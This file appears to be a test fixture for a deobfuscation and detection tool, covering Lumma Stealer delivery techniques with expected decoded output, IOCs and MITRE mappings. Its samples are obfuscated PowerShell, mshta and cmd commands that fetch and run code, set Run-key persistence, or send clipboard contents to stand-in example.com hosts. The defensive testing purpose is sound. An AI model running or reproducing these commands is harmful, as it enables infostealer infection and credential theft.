@@ -1,0 +1,580 @@
+{
+  "family_id": "lumma_stealer",
+  "family_display_name": "Lumma Stealer",
+  "family_version": "r1-2.0.0",
+  "schema_version": "technique-first-1.0.0",
+  "description": "Lumma Stealer (LummaC2) commodity infostealer distributed via ClickFix / fake-CAPTCHA, warez sites, and YouTube descriptions. This pack covers the deterministic PowerShell / MSHTA / CMD delivery layers observed in public IR reports.",
+  "primary_mitre_attack": [
+    "T1204.004",
+    "T1218.005",
+    "T1059.001",
+    "T1059.003",
+    "T1027",
+    "T1027.010",
+    "T1140",
+    "T1115",
+    "T1105",
+    "T1547.001",
+    "T1564.003"
+  ],
+  "primary_behaviors": [
+    "clickfix_delivery",
+    "clipboard_monitor",
+    "download_and_execute",
+    "cmd_to_ps_handoff",
+    "obfuscated_command_line",
+    "registry_run_key_persistence",
+    "beacon_c2",
+    "mshta_delivery"
+  ],
+  "known_technique_universe": [
+    "backtick_alias_obfuscation",
+    "clickfix_powershell_paste",
+    "clipboard_monitor_beacon",
+    "cmd_caret_powershell_handoff",
+    "frombase64string_shellcode_staging",
+    "lumma_rc4_string_decrypt",
+    "mshta_cradle",
+    "native_exe_unpacking",
+    "powershell_encodedcommand_stage",
+    "string_concat_url_obfuscation",
+    "vidar_style_c2_config_pull"
+  ],
+  "coverage_gap_techniques": [
+    "lumma_rc4_string_decrypt",
+    "native_exe_unpacking",
+    "vidar_style_c2_config_pull"
+  ],
+  "techniques": [
+    {
+      "id": "clickfix_powershell_paste",
+      "display_name": "ClickFix / FakeCaptcha PowerShell Paste",
+      "description": "Lumma's dominant 2024 delivery vector: a fake 'I am not a robot' CAPTCHA page instructs the victim to paste a prepared PowerShell command into a Run dialog. Observed extensively by Trellix, Cyfirma, and Sekoia.",
+      "mitre_attack": [
+        "T1204.004",
+        "T1059.001",
+        "T1105"
+      ],
+      "samples": [
+        {
+          "id": "LU001",
+          "variant": "clickfix_iex_downloadstring",
+          "input": "IEX ((New-Object Net.WebClient).DownloadString('http://lumma-clickfix.example.com/verify.ps1'))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://lumma-clickfix.example.com/verify.ps1"
+            ],
+            "iocs_contains": [
+              "http://lumma-clickfix.example.com/verify.ps1"
+            ],
+            "mitre_attack": [
+              "T1204.004",
+              "T1059.001",
+              "T1105"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "clickfix_delivery"
+            ],
+            "capabilities": [
+              "download_cradle"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "3d48bab09a642fe9a8c4499aca7f48f7704d8bc85f5d2da26cc0d7f24a8a89b9",
+              "certificate_fingerprint": "b59415b88940a370a4b447c4faa02b7fec6f1dab82b2ce81792b2e9c3fe76dd6",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:38:49+00:00"
+            }
+          }
+        },
+        {
+          "id": "LU002",
+          "variant": "clickfix_iwr_useb_iex",
+          "input": "iwr https://lumma-fakecaptcha.example.net/robot_check.ps1 -useb | iex",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-WebRequest",
+              "https://lumma-fakecaptcha.example.net/robot_check.ps1",
+              "Invoke-Expression"
+            ],
+            "iocs_contains": [
+              "https://lumma-fakecaptcha.example.net/robot_check.ps1"
+            ],
+            "mitre_attack": [
+              "T1204.004",
+              "T1059.001",
+              "T1105"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "clickfix_delivery"
+            ],
+            "capabilities": [
+              "iwr_pipeline_download"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "8828ec661bbe4a0fab91fb2c9ba4c1c30e0d557d33cfbc823a6e6e6cf7363478",
+              "certificate_fingerprint": "5198c505931f4d377a2d56ad6e0e10e63b30b3b7f88981e3559b4493324c532a",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:38:49+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "mshta_cradle",
+      "display_name": "mshta.exe Cradle",
+      "description": "Older Lumma delivery via mshta.exe fetching a .hta/.js. mshta cradle observed by S2 Grupo Q3-2023 reports.",
+      "mitre_attack": [
+        "T1218.005",
+        "T1059.001",
+        "T1105"
+      ],
+      "samples": [
+        {
+          "id": "LU003",
+          "variant": "mshta_powershell_enc",
+          "input": "mshta.exe http://lumma-mshta.example.com/gate.hta",
+          "expected": {
+            "interpreter": "cmd",
+            "final_interpreter": "mshta",
+            "decoder_chain": [],
+            "final_output_contains": [
+              "mshta.exe",
+              "http://lumma-mshta.example.com/gate.hta"
+            ],
+            "iocs_contains": [
+              "http://lumma-mshta.example.com/gate.hta"
+            ],
+            "mitre_attack": [
+              "T1218.005",
+              "T1105"
+            ],
+            "behaviors": [
+              "mshta_delivery",
+              "lolbas_execution"
+            ],
+            "capabilities": [
+              "mshta_cradle"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "53d14335f67c219951758484c513e6f036e4843c36b5e6540e7294e19f35a18e",
+              "certificate_fingerprint": "295910e0cc16d53c4f89339bdaf62f63007a91a0d8904e08e71c2922bbcee94c",
+              "expected_iterations": 1,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:38:49+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "powershell_encodedcommand_stage",
+      "display_name": "PowerShell -EncodedCommand Stealer Staging",
+      "description": "Lumma stage-2: base64-UTF16LE-wrapped IEX cradle retrieves the actual stealer binary from a rotating C2.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1027",
+        "T1140",
+        "T1105"
+      ],
+      "samples": [
+        {
+          "id": "LU004",
+          "variant": "encodedcommand_iex_stealer_c2",
+          "input": "powershell -EncodedCommand SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBsAHUAbQBtAGEALQBjADIALgBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBzAHQAZQBhAGwAZQByAC4AcABzADEAJwApACkA",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://lumma-c2.example.com/stealer.ps1"
+            ],
+            "iocs_contains": [
+              "http://lumma-c2.example.com/stealer.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1027",
+              "T1140",
+              "T1105"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "capabilities": [
+              "encoded_command",
+              "download_cradle"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "6cb55ea23087f3272b2656aa891abede4fbc9d989a69a9288bddc3f31a88ee45",
+              "certificate_fingerprint": "d2f84e6b922836ad9c6f6670508e618a2c285378c6593e906397425dbfe6b5c6",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:38:49+00:00"
+            }
+          }
+        },
+        {
+          "id": "LU005",
+          "variant": "encodedcommand_hidden_stealer_persistence",
+          "input": "powershell -NoP -W Hidden -Enc UwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4AIgAgAC0ATgBhAG0AZQAgAEwAdQBtAGEAUwB2AGMAIAAtAFYAYQBsAHUAZQAgACIAcABvAHcAZQByAHMAaABlAGwAbAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAASQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBsAHUAbQBtAGEALQBwAC4AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AcwB0AGUAYQBsAGUAcgAuAHAAcwAxACcAKQApACIA",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode"
+            ],
+            "final_output_contains": [
+              "Set-ItemProperty",
+              "CurrentVersion\\Run",
+              "LumaSvc",
+              "http://lumma-p.example.com/stealer.ps1"
+            ],
+            "iocs_contains": [
+              "http://lumma-p.example.com/stealer.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1027",
+              "T1547.001",
+              "T1564.003",
+              "T1105"
+            ],
+            "behaviors": [
+              "registry_run_key_persistence",
+              "download_and_execute",
+              "hidden_window"
+            ],
+            "capabilities": [
+              "encoded_command",
+              "hidden_window",
+              "registry_run_key_persistence"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "155c000d54db7fa83d15819f2ccf879825fbb1df9e0b46b8ec4615709be20a26",
+              "certificate_fingerprint": "36814175b054bec99cf17fcc5d52026dbb0302e914e747137a6093ad9556e51c",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:38:49+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "clipboard_monitor_beacon",
+      "display_name": "Clipboard Monitor Beacon",
+      "description": "Lumma clipboard monitor: a hidden PowerShell loop that reads the clipboard and beacons the contents to the C2 for wallet-address-replacement or credential exfil.",
+      "mitre_attack": [
+        "T1115",
+        "T1059.001",
+        "T1105"
+      ],
+      "samples": [
+        {
+          "id": "LU006",
+          "variant": "encodedcommand_clipboard_loop",
+          "input": "powershell -EncodedCommand dwBoAGkAbABlACgAJAB0AHIAdQBlACkAIAB7ACAAJABjACAAPQAgAEcAZQB0AC0AQwBsAGkAcABiAG8AYQByAGQAOwAgAEkARQBYACAAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbAB1AG0AbQBhAC0AYwBsAGkAcAAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAGIAZQBhAGMAbwBuAD8AYwBsAGkAcAA9ACcAKwAkAGMAKQApADsAIABTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAFMAZQBjAG8AbgBkAHMAIAAzADAAIAB9AA==",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Get-Clipboard",
+              "http://lumma-clip.example.com/beacon",
+              "Start-Sleep"
+            ],
+            "iocs_contains": [
+              "http://lumma-clip.example.com/beacon"
+            ],
+            "mitre_attack": [
+              "T1115",
+              "T1059.001",
+              "T1027",
+              "T1105"
+            ],
+            "behaviors": [
+              "clipboard_monitor",
+              "beacon_c2",
+              "obfuscated_command_line"
+            ],
+            "capabilities": [
+              "encoded_command",
+              "clipboard_monitor",
+              "beacon_c2"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "1bcf889856602e09bd8288314ee259d794924f19bd58921f0456efd2ff1de25d",
+              "certificate_fingerprint": "04440d18997cfb7ace215eb545ef0e81c14b6b9e263092ce2443728c260ca6a0",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:38:49+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "cmd_caret_powershell_handoff",
+      "display_name": "CMD Caret \u2192 PowerShell Launcher",
+      "description": "Fake-installer .bat launches PowerShell via caret-obfuscated cmd shim to defeat signature-based EDR at the CMD layer.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1059.003",
+        "T1027.010",
+        "T1140",
+        "T1105"
+      ],
+      "samples": [
+        {
+          "id": "LU007",
+          "variant": "cmd_caret_ps_enc_lumma_launcher",
+          "input": "c^m^d /c p^ow^ers^he^ll -e^nc SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBsAHUAbQBtAGEALQBsAGEAdQBuAGMAaAAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAGwAdQBtAG0AYQBfAHMAdABlAGEAbABlAHIALgBwAHMAMQAnACkAKQA=",
+          "expected": {
+            "interpreter": "cmd",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "cmd-caret-strip",
+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://lumma-launch.example.com/lumma_stealer.ps1"
+            ],
+            "iocs_contains": [
+              "http://lumma-launch.example.com/lumma_stealer.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1059.003",
+              "T1105",
+              "T1027",
+              "T1140"
+            ],
+            "behaviors": [
+              "cmd_to_ps_handoff",
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "capabilities": [
+              "cmd_ps_handoff",
+              "cmd_caret_obfuscation",
+              "encoded_command",
+              "download_cradle"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "ac29879be188d7fe258cf0d8a9991fddeac5502008f58528699a9cb5ff850a38",
+              "certificate_fingerprint": "7be2833cf7704047e2b776fb7b63f99f39a389397730386a653a1e11427c0ab2",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:38:49+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "string_concat_url_obfuscation",
+      "display_name": "URL String-Concat Obfuscation",
+      "description": "URL for the stealer binary reconstructed from SQ concat fragments so static URL extraction fails.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1105",
+        "T1027.010"
+      ],
+      "samples": [
+        {
+          "id": "LU008",
+          "variant": "three_var_stealer_binary_url",
+          "input": "$a='ht'; $b='tp://lumma-split.example.com'; $c='/lumma.exe'; iex ((new-object net.webclient).downloadstring($a+$b+$c))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "variable-propagate",
+              "string-concat-fold",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://lumma-split.example.com/lumma.exe"
+            ],
+            "iocs_contains": [
+              "http://lumma-split.example.com/lumma.exe"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "capabilities": [
+              "string_concat_obfuscation",
+              "variable_propagation_obfuscation",
+              "download_cradle"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "d1326618ea2522c19f442dde902542407421ed735d0628a2f0fccffb9ffbe810",
+              "certificate_fingerprint": "fdeec2536a65b2e43fec116a38c74881f757bad645e83791cd2544bf0805a848",
+              "expected_iterations": 4,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:38:49+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "backtick_alias_obfuscation",
+      "display_name": "Backtick Alias Obfuscation",
+      "description": "Backticks injected mid-identifier (`i`w`r`, `i`e`x`) to evade string-match signatures.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1027.010"
+      ],
+      "samples": [
+        {
+          "id": "LU009",
+          "variant": "backtick_iwr_useb_iex",
+          "input": "i`wr 'http://lumma-bt.example.com/lumma_bt.ps1' -useb | i`ex",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "backtick-strip",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-WebRequest",
+              "http://lumma-bt.example.com/lumma_bt.ps1",
+              "Invoke-Expression"
+            ],
+            "iocs_contains": [
+              "http://lumma-bt.example.com/lumma_bt.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "backtick_obfuscation",
+              "download_and_execute"
+            ],
+            "capabilities": [
+              "backtick_obfuscation",
+              "iwr_pipeline_download"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "da12d7bf0c5fdc97c9a8a1b0db0cfde70e0d07e2abfee323dd09d0b1a40ae177",
+              "certificate_fingerprint": "de677fb5360f4b79002c4a286e89728ed9a9b2ee67b9c6fa798fce92c00d2909",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:38:49+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "frombase64string_shellcode_staging",
+      "display_name": "[Convert]::FromBase64String Shellcode Staging",
+      "description": "Lumma's fallback in-memory delivery: `$b = [Convert]::FromBase64String('...'); IEX $b` after the initial .exe fails to write to disk (AV interference).",
+      "mitre_attack": [
+        "T1059.001",
+        "T1027",
+        "T1140",
+        "T1105"
+      ],
+      "samples": [
+        {
+          "id": "LU010",
+          "variant": "frombase64string_inmemory_stealer",
+          "input": "$b = [Convert]::FromBase64String('SUVYICgoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovL2x1bW1hLWI2NC5leGFtcGxlLmNvbS9maW5hbF9zdGVhbGVyLnBzMScpKTsg'); IEX $b",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "decoder-frombase64string-fold",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://lumma-b64.example.com/final_stealer.ps1"
+            ],
+            "iocs_contains": [
+              "http://lumma-b64.example.com/final_stealer.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027",
+              "T1140"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "shellcode_staging"
+            ],
+            "capabilities": [
+              "shellcode_staging",
+              "variable_propagation_obfuscation"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "ae769bbb10e6f593698e86a55017a0c064bcd6fdca10c9c171c0f21c561b670e",
+              "certificate_fingerprint": "661fa6170b5f7257e6f7efbac6cbda74c2f918d378f51d84a6c6181bb818f286",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:38:49+00:00"
+            }
+          }
+        }
+      ]
+    }
+  ],
+  "fingerprint_schema_version": "r1-2.0.0"
+}
